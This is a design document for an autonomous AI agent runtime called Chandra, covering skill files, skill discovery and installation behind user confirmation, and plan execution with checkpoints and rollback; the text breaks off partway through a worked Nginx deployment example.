# Chandra Autonomy Systems — Design Document

> Self-extending capabilities: skills, discovery, composition, and autonomous execution.

**Status:** Design phase  
**Last updated:** 2026-03-01  
**Parent doc:** DESIGN.md (core runtime)

This document covers Chandra's autonomous capability systems — how it learns new
skills, discovers integrations, and composes them to accomplish complex goals.

---

## 0. Core Changes Required

Before implementing autonomy features, apply these changes to the core runtime (DESIGN.md components):

### 0.1 ToolCall Struct (internal/tools/types.go)

Add execution context fields:

```go
type ToolCall struct {
    ID         string
    Name       string
    Parameters json.RawMessage
    // v2: Context for execution (populated by agent loop)
    SkillName  string          // Which skill triggered this call, if any (empty for direct)
    PlanID     string          // Which plan this belongs to, if any
    StepIndex  int             // Step index within plan, if any
}
```

### 0.2 ActionType Enum (internal/action/types.go)

Add plan-related action types:

```go
const (
    ActionToolCall    ActionType = "tool_call"
    ActionMessageSent ActionType = "message_sent"
    ActionScheduled   ActionType = "scheduled"
    ActionConfirm     ActionType = "confirmation"
    ActionError       ActionType = "error"
    // v2: Plan execution tracking
    ActionRollback    ActionType = "rollback"     // Plan step rolled back
    ActionPlanStart   ActionType = "plan_start"   // Execution plan started
    ActionPlanEnd     ActionType = "plan_end"     // Execution plan completed/failed
)
```

### 0.3 Confirmations Table (migrations)

Add plan correlation columns:

```sql
-- Add to existing confirmations table
ALTER TABLE confirmations ADD COLUMN plan_id TEXT;
ALTER TABLE confirmations ADD COLUMN step_index INTEGER;
CREATE INDEX idx_confirmations_plan ON confirmations(plan_id) WHERE plan_id IS NOT NULL;
```

Or if creating fresh:

```sql
CREATE TABLE confirmations (
    id           TEXT PRIMARY KEY,
    session_id   TEXT NOT NULL,
    tool_name    TEXT NOT NULL,
    parameters   TEXT NOT NULL,
    description  TEXT NOT NULL,
    requested_at INTEGER NOT NULL,
    expires_at   INTEGER NOT NULL,
    status       TEXT DEFAULT 'pending',
    -- v2: Plan correlation
    plan_id      TEXT,
    step_index   INTEGER
);
CREATE INDEX idx_confirmations_session ON confirmations(session_id, status);
CREATE INDEX idx_confirmations_plan ON confirmations(plan_id) WHERE plan_id IS NOT NULL;
```

### 0.4 Event Types (internal/events/types.go)

Add plan-related events for the scheduler:

```go
const (
    // ... existing events ...
    
    // v2: Plan events
    EventPlanConfirmed   EventType = "plan_confirmed"    // User approved/rejected checkpoint
    EventPlanTimeout     EventType = "plan_timeout"      // Checkpoint timed out
    EventSkillApproved   EventType = "skill_approved"    // Generated skill approved
)

type PlanConfirmedEvent struct {
    PlanID    string
    StepIndex int
    Approved  bool
    UserID    string
}
```

### 0.5 Config Additions (internal/config/config.go)

Add skills configuration:

```go
type SkillsConfig struct {
    Directory        string  `toml:"directory"`         // Default: ~/.config/chandra/skills
    Priority         float64 `toml:"priority"`          // Default: 0.7
    MaxContextTokens int     `toml:"max_context_tokens"` // Default: 2000
    MaxMatches       int     `toml:"max_matches"`       // Default: 3
}
```

---

## 1. Overview

Chandra's autonomy comes from three interconnected systems:

```
┌─────────────────────────────────────────────────────────────────────┐
│                        USER REQUEST                                 │
│                    "Deploy an app to my server"                     │
└───────────────────────────┬─────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      SKILL SYSTEM                                   │
│         Load SKILL.md files, match by triggers, inject context      │
│                                                                     │
│   Skills provide instructions for accomplishing tasks using         │
│   CLI tools, APIs, or Chandra's built-in tools.                     │
└───────────────────────────┬─────────────────────────────────────────┘
                            │
              ┌─────────────┴─────────────┐
              │ Skill exists?             │
              │                           │
         YES  ▼                      NO   ▼
┌─────────────────────┐    ┌─────────────────────────────────────────┐
│   Use existing      │    │           SKILL DISCOVERY               │
│   skill             │    │                                         │
└─────────────────────┘    │   Search for integration options        │
                           │   Find CLI tools, evaluate approaches   │
                           │   Install dependencies (with confirm)   │
                           │   Generate SKILL.md automatically       │
                           └───────────────────┬─────────────────────┘
                                               │
                                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│                    SKILL COMPOSITION                                │
│                                                                     │
│   Complex goals require multiple skills chained together.           │
│   The Planner decomposes goals, the Executor runs them.             │
│                                                                     │
│   If infrastructure is missing (no Docker host), create it.         │
│   Confirmation gates at key decision points.                        │
│   Rollback on failure.                                              │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 2. Skill System

### 2.1 What is a Skill?

**Skills are instructional context** that teach Chandra how to accomplish tasks.
They're different from Tools:

| Concept | What it is | Example |
|---------|------------|---------|
| **Tool** | Executable Go code the agent invokes | `exec`, `web_search`, `homeassistant.turn_on` |
| **Skill** | Instructions loaded into context | "Use `gh pr list` to list pull requests" |

A skill might:
- Wrap a CLI tool (`gh`, `kubectl`, `docker`)
- Reference Chandra Tools (`homeassistant.*`)
- Provide domain knowledge (no tools needed)
- Combine all of the above

### 2.2 SKILL.md Format

Skills are defined in markdown files with YAML frontmatter:

```markdown
---
name: github
description: GitHub operations via gh CLI
version: 1.0.0

triggers:
  - github
  - pull request
  - PR
  - issue
  - repository
  - actions

requires:
  bins: ["gh"]              # CLI tools that must be in PATH
  tools: []                 # Chandra tools this skill uses
  env: ["GH_TOKEN"]         # Or: gh auth login

config:
  default_repo: ""          # Optional skill-specific config

generated:                  # Present if auto-generated
  by: chandra
  date: 2026-03-01
  source: "gh --help exploration"
---

# GitHub Skill

Interact with GitHub repositories, issues, PRs, and actions via the `gh` CLI.

## Authentication

Ensure you're authenticated:
```bash
gh auth status
```

If not, run `gh auth login` or set `GH_TOKEN` environment variable.

## Common Operations

### Issues

List open issues:
```bash
gh issue list --state open
```

Create an issue:
```bash
gh issue create --title "Bug: ..." --body "Description..."
```

View issue details:
```bash
gh issue view <number>
```

### Pull Requests

List open PRs:
```bash
gh pr list --state open
```

Create a PR:
```bash
gh pr create --title "Feature: ..." --body "..." --base main
```

Check out a PR locally:
```bash
gh pr checkout <number>
```

Merge a PR:
```bash
gh pr merge <number> --merge
```

### Repository

Clone a repo:
```bash
gh repo clone owner/repo
```

View repo info:
```bash
gh repo view owner/repo
```

## Tips

- Use `--json` flag for machine-readable output
- Use `--jq` to filter JSON output
- Most commands work without specifying repo if you're in a git directory
```

### 2.3 Skill Directory Structure

```
~/.config/chandra/skills/
├── github/
│   └── SKILL.md
├── proxmox/
│   ├── SKILL.md
│   └── tools.go          # Optional: Go tool implementations
├── docker/
│   └── SKILL.md
├── kubernetes/
│   ├── SKILL.md
│   └── scripts/          # Optional: helper scripts
│       └── pod-logs.sh
└── weather/
    └── SKILL.md          # Simple skill, just wraps wttr.in
```

### 2.4 Skill Registry

```go
type Skill struct {
    Name        string
    Description string
    Version     string
    Triggers    []string
    Requires    SkillRequirements
    DependsOn   []string          // Other skills required (e.g., ["docker"] for kubernetes)
    Config      map[string]any
    Summary     string            // Short description (< 100 tokens) for context injection
    Content     string            // Full markdown instructions (fetched on demand if large)
    Tools       []Tool            // Go tools defined by this skill
    Path        string            // Path to SKILL.md
    Generated   *GeneratedMeta    // Non-nil if auto-generated
}

type SkillRequirements struct {
    Bins  []string  // CLI tools that must be in PATH
    Tools []string  // Chandra tools this skill uses
    Env   []string  // Environment variables that must be set
}

type GeneratedMeta struct {
    By       string       // "chandra"
    Date     time.Time
    Source   string       // How it was generated
    Status   SkillStatus  // pending_review | approved | rejected
    Reviewer string       // User who approved, if applicable
    ReviewedAt time.Time
}

type SkillStatus string

const (
    SkillPendingReview SkillStatus = "pending_review"
    SkillApproved      SkillStatus = "approved"
    SkillRejected      SkillStatus = "rejected"
)

type SkillRegistry interface {
    // Load scans skills directory, parses SKILL.md files, validates requirements
    Load(ctx context.Context, skillsDir string) error
    
    // Reload rescans directory for new/changed skills
    Reload(ctx context.Context) error
    
    // Match returns skills relevant to the message (based on triggers)
    // ONLY returns skills where Generated == nil OR Generated.Status == SkillApproved
    Match(message string) []Skill
    
    // Get returns a specific skill by name (regardless of approval status)
    Get(name string) (Skill, bool)
    
    // All returns all loaded skills (regardless of approval status)
    All() []Skill
    
    // Approved returns only approved skills (for context injection)
    Approved() []Skill
    
    // PendingReview returns skills awaiting user approval
    PendingReview() []Skill
    
    // Register adds a new skill (used by skill generator)
    // Generated skills are registered with Status = pending_review
    Register(skill Skill) error
    
    // Approve marks a generated skill as approved
    Approve(name string, reviewer string) error
    
    // Reject marks a generated skill as rejected (won't be loaded on restart)
    Reject(name string, reviewer string) error
    
    // Unmet returns skills that couldn't load due to missing requirements
    Unmet() []UnmetSkill
    
    // AcquireGenerationLock prevents duplicate skill generation
    AcquireGenerationLock(skillName string) (acquired bool, release func())
}

// Generation lock with heartbeat (prevents 5-min wait if holder crashes)
type GenerationLock struct {
    SkillName   string
    HolderID    string    // Unique instance ID
    AcquiredAt  time.Time
    HeartbeatAt time.Time // Updated every 30s by holder
    ExpiresAt   time.Time // Lock expires if no heartbeat for 60s
}

// Lock acquisition: if existing lock has no heartbeat for 60s, consider it abandoned

// Race condition prevention for parallel discovery:
// If two sessions simultaneously discover the same missing skill:
// 1. Both call AcquireGenerationLock("github")
// 2. First caller acquires lock, proceeds with generation
// 3. Second caller gets acquired=false, waits for lock release
// 4. When lock released, second caller checks if skill now exists
// 5. If exists: use it. If not: acquire lock and generate.
//
// Lock is stored in database with timeout (5 min) to handle abandoned locks.

type UnmetSkill struct {
    Name    string
    Path    string
    Missing []string  // What's missing: "bin:gh", "env:GH_TOKEN"
}
```

### 2.5 Skill Loading Flow

```
chandrad starts
    │
    ▼
Scan ~/.config/chandra/skills/ recursively
    │
    ▼
For each SKILL.md found:
    │
    ├── Parse YAML frontmatter
    ├── Parse markdown content
    ├── Validate requirements:
    │   ├── Check bins in PATH (which gh)
    │   ├── Check env vars set
    │   └── Check referenced tools exist
    │
    ├── If requirements met:
    │   ├── Check Generated.Status (if generated): skip if pending_review/rejected
    │   └── Register skill ✓ (only if approved or not generated)
    │
    └── If requirements NOT met:
        ├── Log warning with missing items
        └── Add to Unmet() list (user can fix and reload)
```

### 2.6 Context Injection

When a message arrives, relevant skills are injected into context:

```go
func (l *AgentLoop) Run(ctx context.Context, session *Session, msg InboundMessage) {
    // ... load memories, identity ...
    
    // Match skills by triggers
    matchedSkills := l.skillRegistry.Match(msg.Content)
    
    // Convert to context candidates
    for _, skill := range matchedSkills {
        candidates = append(candidates, ContextCandidate{
            Role:     "skill",
            Content:  skill.Content,  // The markdown instructions
            Priority: 0.7,            // Skills are fairly high priority
            Recency:  time.Now(),     // Treated as fresh
            Tokens:   countTokens(skill.Content),
        })
    }
    
    // CBM decides which skills fit in budget
    context := l.budget.Assemble(ctx, tokenBudget, fixed, candidates)
    
    // ... continue with LLM call ...
}
```

**Context budget pressure:** Skills at Priority 0.7 can displace semantic memories
(Priority ~0.5). This is a meaningful tradeoff.

**Mitigation strategies:**
1. **Configurable skill priority:** Default 0.7, can lower to 0.4-0.6 in config if memory
   retrieval is more valuable for your use case
2. **Skill token budget:** Cap total tokens from skills (default: 2000 tokens max across
   all matched skills, configurable via `[skills] max_context_tokens`)
3. **Match limit:** Maximum 3 skills matched per message (configurable)
4. **Concise content:** Keep skills focused — common patterns, not exhaustive docs

```toml
[skills]
priority = 0.6              # Lower than default to preserve memory
max_context_tokens = 1500   # Cap skill token usage
max_matches = 2             # At most 2 skills per message
```

**Trigger specificity is critical:**
- Too broad: `triggers: ["docker"]` matches every infrastructure question
- Too narrow: `triggers: ["docker-compose-up-detached"]` never matches
- Right balance: `triggers: ["docker", "container", "docker-compose", "dockerfile"]`

### 2.7 Skill + Tool Interaction

**Important:** Go tools (tools.go) are **compiled into the binary**, not dynamically loaded.

**Skill types by location:**
| Location | SKILL.md | tools.go | Created by |
|----------|----------|----------|------------|
| `internal/skills/` (source) | ✓ | ✓ | Developer, compiled in |
| `~/.config/chandra/skills/` | ✓ | ✗ | User or generated |

User-local skills (`~/.config/chandra/skills/`) can **only** contain SKILL.md files.
Any tools.go in that directory is **ignored** — this is intentional to prevent
arbitrary code execution from generated or user-created skills.

To add a skill with custom Go tools, add to `internal/skills/` in source and recompile.

A *built-in* skill (in source) can define Go tools alongside its SKILL.md:

```
skills/homeassistant/
├── SKILL.md        # Instructions for using Home Assistant
└── tools.go        # Actual tool implementations
```

**tools.go:**
```go
package homeassistant

import "github.com/jrimmer/chandra/pkg"

type TurnOnTool struct {
    baseURL string
    token   string
}

func (t *TurnOnTool) Definition() pkg.ToolDef {
    return pkg.ToolDef{
        Name:        "homeassistant.turn_on",
        Description: "Turn on a Home Assistant entity",
        Parameters:  turnOnSchema,
        Tier:        pkg.TierTrusted,
        Capabilities: []pkg.Capability{pkg.CapNetworkOut},
    }
}

func (t *TurnOnTool) Execute(ctx context.Context, call pkg.ToolCall) (pkg.ToolResult, error) {
    // ... implementation ...
}

// Register is called by the skill loader
func Register(registry pkg.Registry, config map[string]any) error {
    tool := &TurnOnTool{
        baseURL: config["url"].(string),
        token:   config["token"].(string),
    }
    return registry.Register(tool)
}
```

The SKILL.md provides context (when to use, examples), while tools.go provides
structured execution with type safety and telemetry.

---

## 3. Skill Discovery & Provisioning

When a user requests an integration that doesn't exist, Chandra can bootstrap it.

### 3.1 Discovery Flow

```
User: "I need to integrate with GitHub"
                │
                ▼
┌───────────────────────────────────────────────────────────┐
│ CHECK EXISTING                                            │
│                                                           │
│ skillRegistry.Get("github") → not found                   │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ SEARCH FOR OPTIONS                                        │
│                                                           │
│ Web search: "GitHub CLI integration"                      │
│ Web search: "GitHub API best practices"                   │
│                                                           │
│ Found options:                                            │
│   1. gh CLI (official GitHub CLI)                         │
│   2. hub CLI (older, less maintained)                     │
│   3. Direct API via curl                                  │
│   4. Go library (go-github)                               │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ EVALUATE OPTIONS                                          │
│                                                           │
│ Prefer CLI tools because:                                 │
│   - Can wrap without compiling Go code                    │
│   - User can also use directly                            │
│   - Usually well-documented                               │
│                                                           │
│ Best option: gh CLI                                       │
│   - Official, maintained by GitHub                        │
│   - Full-featured                                         │
│   - Available via apt/brew                                │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ REQUEST CONFIRMATION (Tier 4)                             │
│                                                           │
│ "I recommend the official gh CLI. I'll need to:           │
│   1. Install gh via apt                                   │
│   2. Guide you through authentication                     │
│   3. Create a skill for GitHub operations                 │
│                                                           │
│ Proceed?"                                                 │
│                                                           │
│ [Confirm] [Choose different approach] [Cancel]            │
└───────────────────────────────┬───────────────────────────┘
                                │
                         User confirms
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ INSTALL                                                   │
│                                                           │
│ Detect package manager:                                   │
│   - apt (Debian/Ubuntu)                                   │
│   - brew (macOS)                                          │
│   - dnf (Fedora)                                          │
│   - pacman (Arch)                                         │
│                                                           │
│ Execute: sudo apt install gh                              │
│ Verify: gh --version → gh version 2.40.0                  │
└───────────────────────────────┬───────────────────────────┘

**Progress communication:** Discovery can take 15-60 seconds. Stream progress to user:
```
"Setting up GitHub integration...
 → Searching for integration options...
 → Found: gh CLI (official GitHub CLI)
 → Installing gh via apt... done
 → Exploring capabilities (12 subcommands found)...
 → Generating skill documentation...
 → Ready for authentication setup."
```
Never leave the user waiting without feedback.
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ EXPLORE CAPABILITIES                                      │
│                                                           │
│ gh --help                                                 │
│ gh issue --help                                           │
│ gh pr --help                                              │
│ gh repo --help                                            │
│ ...                                                       │
│                                                           │
│ Build understanding of:                                   │
│   - Available commands                                    │
│   - Common flags                                          │
│   - Output formats                                        │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ SETUP AUTHENTICATION                                      │
│                                                           │
│ "gh needs authentication. You can either:                 │
│   1. Run: gh auth login (interactive)                     │
│   2. Set GH_TOKEN environment variable                    │
│                                                           │
│ Which do you prefer?"                                     │
│                                                           │
│ User: "I'll do the interactive login"                     │
│                                                           │
│ → Guide user through gh auth login                        │
│ → Verify: gh auth status ✓                                │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ GENERATE SKILL.md                                         │
│                                                           │
│ Create ~/.config/chandra/skills/github/SKILL.md           │
│                                                           │
│ Content based on:                                         │
│   - Explored --help output                                │
│   - Common use patterns from web search                   │
│   - Official documentation                                │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ VALIDATE                                                  │
│                                                           │
│ Test basic operations:                                    │
│   - gh auth status ✓                                      │
│   - gh repo list --limit 1 ✓                              │
│                                                           │
│ Register skill with SkillRegistry (status: pending_review)│
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ PENDING APPROVAL                                          │
│                                                           │
│ "📋 GitHub integration skill created!                     │
│                                                           │
│  **Pending your review.** To activate:                    │
│    chandra skill approve github                           │
│                                                           │
│  To preview first:                                        │
│    chandra skill show github                              │
│                                                           │
│  Once approved, I can:                                    │
│    - List and create issues                               │
│    - Manage pull requests                                 │
│    - Clone and manage repositories                        │
│    - Check workflow runs                                  │
│                                                           │
│  Skill file: ~/.config/chandra/skills/github/SKILL.md"    │
└───────────────────────────────────────────────────────────┘

**Important:** Generated skills are NOT active until approved. This is the
primary defense against prompt injection via malicious web content.

After approval, the skill survives daemon restarts (stored in SQLite with
status = approved). Rejected skills are marked status = rejected and ignored.
```

### 3.2 Skill Generator Tool

```go
type SkillGeneratorTool struct {
    registry    SkillRegistry
    pkgManager  PackageManager
    webSearch   WebSearchTool
}

func (s *SkillGeneratorTool) Definition() ToolDef {
    return ToolDef{
        Name:        "skill_generator",
        Description: "Discover, install, and create a skill for an integration",
        Parameters:  skillGenSchema,
        Tier:        TierIsolated,  // Tier 3: out-of-process, restricted
        Capabilities: []Capability{
            CapProcessExec,   // To install packages and explore CLIs
            CapFileWrite,     // To create SKILL.md
            CapNetworkOut,    // To search for options
        },
    }
}

// skill_generator is ALWAYS Tier 4 (confirmation required) via registry rules
// because it installs software and creates files. The Tier 3 designation
// means it runs out-of-process for isolation; Tier 4 is the confirmation gate.
```

### 3.3 Package Manager Detection

```go
type PackageManager interface {
    Name() string                                    // "apt", "brew", etc.
    Install(ctx context.Context, pkg string) error
    IsInstalled(pkg string) bool
    Search(pkg string) ([]PackageInfo, error)
}

func detectPackageManager() PackageManager {
    switch {
    case commandExists("apt"):
        return &AptManager{}
    case commandExists("brew"):
        return &BrewManager{}
    case commandExists("dnf"):
        return &DnfManager{}
    case commandExists("pacman"):
        return &PacmanManager{}
    default:
        return &ManualManager{}  // Prompts user for install instructions
    }
}
```

### 3.4 CLI Exploration

When discovering a CLI tool's capabilities:

```go
type CLIExplorer struct {
    MaxSubcommands  int           // Max subcommands to explore (default: 20)
    MaxDepth        int           // Max nesting depth (default: 2)
    CommandTimeout  time.Duration // Timeout per command (default: 5s)
    MaxOutputBytes  int           // Max bytes to capture per command (default: 64KB)
}

func (e *CLIExplorer) Explore(ctx context.Context, command string) (*CLICapabilities, error) {
    caps := &CLICapabilities{
        Command: command,
    }
    
    // Apply defaults
    if e.MaxSubcommands == 0 { e.MaxSubcommands = 20 }
    if e.MaxDepth == 0 { e.MaxDepth = 2 }
    if e.CommandTimeout == 0 { e.CommandTimeout = 5 * time.Second }
    if e.MaxOutputBytes == 0 { e.MaxOutputBytes = 64 * 1024 }
    
    // Get version (with timeout)
    vCtx, cancel := context.WithTimeout(ctx, e.CommandTimeout)
    version, _ := execLimited(vCtx, e.MaxOutputBytes, command, "--version")
    cancel()
    caps.Version = parseVersion(version)
    
    // Get top-level help
    hCtx, cancel := context.WithTimeout(ctx, e.CommandTimeout)
    help, _ := execLimited(hCtx, e.MaxOutputBytes, command, "--help")
    cancel()
    caps.Subcommands = parseSubcommands(help)
    
    // Explore subcommands (bounded)
    explored := 0
    for _, sub := range caps.Subcommands {
        if explored >= e.MaxSubcommands {
            caps.Truncated = true
            break
        }
        sCtx, cancel := context.WithTimeout(ctx, e.CommandTimeout)
        subHelp, err := execLimited(sCtx, e.MaxOutputBytes, command, sub, "--help")
        cancel()
        if err == nil {
            caps.SubcommandHelp[sub] = subHelp
            explored++
        }
        // Skip subcommands that hang, page, or error
    }
    
    caps.HasJSON = strings.Contains(help, "--json")
    caps.HasVerbose = strings.Contains(help, "--verbose")
    
    return caps, nil
}

// Note: For large CLIs (kubectl, aws, gcloud), exploration will be partial.
// The generated SKILL.md includes a note: "Explored 20 of N subcommands.
// Run 'kubectl <subcommand> --help' for commands not covered here."
```

---

## 4. Autonomous Skill Composition

The real power emerges when Chandra chains skills together to accomplish complex
goals, creating infrastructure and skills as needed.

### 4.1 Goal Decomposition

When a user states a goal, the Planner breaks it into steps:

```
User: "Deploy a blog using Ghost"
                │
                ▼
┌───────────────────────────────────────────────────────────┐
│ UNDERSTAND THE GOAL                                       │
│                                                           │
│ What is Ghost? → Blogging platform                        │
│ How is it deployed? → Docker, Node.js, managed hosting    │
│ What does user have? → Check available skills             │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ CHECK AVAILABLE CAPABILITIES                              │
│                                                           │
│ Skills:                                                   │
│   ✓ proxmox (can create VMs/containers)                   │
│   ✓ docker (can deploy containers)                        │
│   ✗ ghost (no specific skill)                             │
│                                                           │
│ Infrastructure:                                           │
│   ✓ Docker host exists (LXC 104)                          │
│   ✓ Proxmox has resources available                       │
└───────────────────────────────┬───────────────────────────┘
                                │
                                ▼
┌───────────────────────────────────────────────────────────┐
│ GENERATE EXECUTION PLAN                                   │
│                                                           │
│ Step 1: Search for Ghost Docker deployment                │
│ Step 2: Determine requirements (MySQL, volumes)           │
│ Step 3: Create docker-compose.yml                         │
│ Step 4: [CONFIRM] Deploy to docker-host                   │
│ Step 5: Wait for startup                                  │
│ Step 6: Verify accessible                                 │
│ Step 7: Report URL and next steps                         │
│                                                           │
│ Rollback plan:                                            │
│   - Step 4 fails → remove partial containers              │
│   - Step 3 fails → delete compose file                    │
└───────────────────────────────────────────────────────────┘
```

### 4.2 Capability Graph

Skills and infrastructure form a graph of capabilities:

```
                         ┌──────────────┐
                         │  Deploy App  │
                         └───────┬──────┘
                                 │
         ┌───────────────────────┼───────────────────────┐
         ▼                       ▼                       ▼
   ┌───────────┐          ┌───────────┐          ┌───────────┐
   │  Docker   │          │ Bare Metal│          │   K8s     │
   │  Deploy   │          │  Deploy   │          │  Deploy   │
   └─────┬─────┘          └─────┬─────┘          └─────┬─────┘
         │                      │                      │
         ▼                      ▼                      ▼
   ┌───────────┐          ┌───────────┐          ┌───────────┐
   │  Docker   │          │    SSH    │          │  kubectl  │
   │   Host    │          │   Access  │          │  Access   │
   └─────┬─────┘          └───────────┘          └───────────┘
         │
         ├── Exists? ─── YES ──▶ Use it
         │
         └── NO ──▶ Can create?
                         │
         ┌───────────────┴───────────────┐
         ▼                               ▼
   ┌───────────┐                  ┌───────────┐
   │  Proxmox  │                  │  Cloud    │
   │ LXC / VM  │                  │  Provider │
   └───────────┘                  └───────────┘
```

The Planner traverses this graph to find a path from current state to goal.

### 4.3 Planner Interface

```go
// ExecutionPlan represents a decomposed goal
type ExecutionPlan struct {
    ID          string
    Goal        string
    Steps       []ExecutionStep
    Checkpoints []int             // Step indices requiring confirmation
    State       map[string]any    // Accumulated state across steps
}

type ExecutionStep struct {
    ID          string
    Description string            // Human-readable description
    SkillName   string            // Which skill to use (empty for built-in)
    Action      string            // What to do
    Parameters  map[string]any    // Parameters for the action
    DependsOn   []string          // Step IDs this depends on
    Creates     []string          // Resources this step creates
    Rollback    *RollbackAction   // How to undo this step
    Checkpoint  bool              // Requires user confirmation
}

type RollbackAction struct {
    Description string
    SkillName   string
    Action      string
    Parameters  map[string]any
}

type Planner interface {
    // Decompose breaks a goal into an execution plan
    Decompose(ctx context.Context, goal string) (*ExecutionPlan, error)
    
    // IdentifyGaps finds missing skills/infrastructure needed
    IdentifyGaps(ctx context.Context, plan *ExecutionPlan) ([]Gap, error)
    
    // Replan adjusts plan based on execution results or failures
    Replan(ctx context.Context, plan *ExecutionPlan, failedStep int) (*ExecutionPlan, error)
}

type Gap struct {
    Type        string  // "skill", "infrastructure", "credential"
    Name        string  // What's missing
    Required    bool    // Can we proceed without it?
    Resolution  string  // How to fix: "create", "install", "configure"
}
```

### 4.4 Executor Interface

```go
type ExecutionResult struct {
    PlanID      string
    Success     bool
    StepsRun    int
    FailedAt    int               // -1 if no failure
    Error       error
    Outputs     map[string]any    // Results from each step
    RolledBack  bool              // True if rollback was performed
}

type Executor interface {
    // Run executes a plan until completion or checkpoint
    // Returns immediately when hitting a checkpoint (does NOT block waiting)
    // Checkpoint creates a Tier 4 confirmation row; approval triggers OnPlanConfirmed event
    Run(ctx context.Context, plan *ExecutionPlan) (*ExecutionResult, error)
    
    // Resume continues execution after checkpoint confirmation
    // Called by event handler when confirmation is approved
    Resume(ctx context.Context, planID string, approved bool) (*ExecutionResult, error)
    
    // Rollback undoes completed steps
    Rollback(ctx context.Context, plan *ExecutionPlan, upToStep int) error
    
    // Status returns current execution status
    Status(planID string) (*ExecutionStatus, error)
}

// Checkpoint flow uses core's async Tier 4 model:
//
// 1. Executor.Run() reaches checkpoint step
// 2. Write confirmation row: {plan_id, step_index, prompt, status: pending}
// 3. Return ExecutionResult with State: "paused_at_checkpoint"
// 4. (Later) User approves via CLI/channel
// 5. Scheduler receives OnPlanConfirmed event
// 6. Scheduler calls Executor.Resume(planID, approved)
// 7. Execution continues or rolls back
//
// This matches core's "write row, return immediately, execute on later turn" model.

type ExecutionStatus struct {
    PlanID          string
    State           string  // "running", "paused_at_checkpoint", "completed", "failed", "rolled_back"
    CurrentStep     int
    CheckpointStep  int     // Non-zero if paused at checkpoint
    Outputs         map[string]any
}
```

### 4.5 Infrastructure Awareness

Chandra maintains awareness of available infrastructure:

```go
type InfrastructureState struct {
    Hosts       []Host              // Known hosts (Proxmox nodes, VMs, etc.)
    Services    []Service           // Running services
    Resources   map[string]Resource // Available resources per host
    LastUpdated time.Time
}

type Host struct {
    ID          string
    Name        string
    Type        string              // "proxmox_node", "vm", "lxc", "bare_metal"
    Address     string              // IP or hostname
    Access      AccessMethod        // How to reach it (SSH, API)
    Capabilities []string           // What it can do: "docker", "k8s", "lxc"
    Parent      string              // Parent host ID (e.g., VM's Proxmox node)
}

type Service struct {
    ID          string
    Name        string
    Type        string              // "docker_container", "systemd", "k8s_pod"
    Host        string              // Which host it runs on
    Status      string              // "running", "stopped", "unknown"
    Ports       []PortMapping
    CreatedBy   string              // Plan ID that created this, if known
}

type InfrastructureManager interface {
    // Discover scans known hosts for services and resources
    Discover(ctx context.Context) error
    
    // GetState returns current infrastructure state
    GetState() *InfrastructureState
    
    // FindHost finds hosts matching criteria
    FindHost(criteria HostCriteria) []Host
    
    // FindService finds services matching criteria
    FindService(criteria ServiceCriteria) []Service
    
    // RecordCreation tracks that a plan created infrastructure
    RecordCreation(planID string, created []string) error
    
    // HostStatus returns reachability status for a host
    HostStatus(hostID string) HostReachability
}

type HostReachability struct {
    Reachable    bool
    LastChecked  time.Time
    LastSuccess  time.Time
    ErrorCount   int
    LastError    string
}

// Discovery failure behavior:
// - Individual host failures don't fail the whole discovery
// - Unreachable hosts are marked with HostReachability.Reachable = false
// - Stale data (last success > cache TTL) is still returned but flagged
// - Planner checks HostStatus before including host in plans
// - If a host hasn't been reachable for >24h, warn user before using it
```

### 4.6 Confirmation Gates

Checkpoints in execution plans require user confirmation:

```go
// Checkpoint reasons (what triggers a confirmation requirement)
const (
    CheckpointInstallSoftware    = "install_software"
    CheckpointCreateInfra        = "create_infrastructure"
    CheckpointModifyData         = "modify_data"
    CheckpointExternalAction     = "external_action"
    CheckpointDestructive        = "destructive"
    CheckpointCostImplication    = "cost_implication"
)

// When executor reaches a checkpoint:
// 1. Pause execution
// 2. Send confirmation request to user via active channel
// 3. Wait for response (with timeout from confirmations table)
// 4. On confirm: continue execution
// 5. On reject: rollback completed steps
```

### 4.7 Rollback Mechanics

When a step fails, previous steps are rolled back in reverse order:

```go
func (e *executor) Rollback(ctx context.Context, plan *ExecutionPlan, upToStep int) error {
    // Rollback in reverse order
    for i := upToStep; i >= 0; i-- {
        step := plan.Steps[i]
        
        if step.Rollback == nil {
            log.Warn("step has no rollback action", "step", step.ID)
            continue
        }
        
        // Execute rollback action
        err := e.executeRollback(ctx, step.Rollback)
        if err != nil {
            log.Error("rollback failed", "step", step.ID, "error", err)
            // Continue rolling back other steps
        }
        
        // Record rollback in action log
        e.actionLog.Record(ctx, ActionEntry{
            Type:    ActionRollback,
            Summary: fmt.Sprintf("Rolled back: %s", step.Description),
        })
    }
    
    return nil
}
```

---

## 5. Example: Complete Flow

**User:** "I want to deploy Nginx"

```
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 1: UNDERSTAND                                                  │
│                                                                     │
│ Nginx is a web server / reverse proxy.                              │
│ Common deployment: Docker container.                                │
└───────────────────────────────────┬─────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 2: CHECK CAPABILITIES                                          │
│                                                                     │
│ Skills available:                                                   │
│   ✓ proxmox - can query/manage VMs and containers                   │
│   ✗ docker - not yet configured                                     │
│                                                                     │
│ Query Proxmox for Docker hosts:                                     │
│   → ssh proxmox pvesh get /cluster/resources --type vm              │
│   → Found: LXC 104 "docker-host" on vm2                             │
└───────────────────────────────────┬─────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 3: FILL CAPABILITY GAP                                         │
│                                                                     │
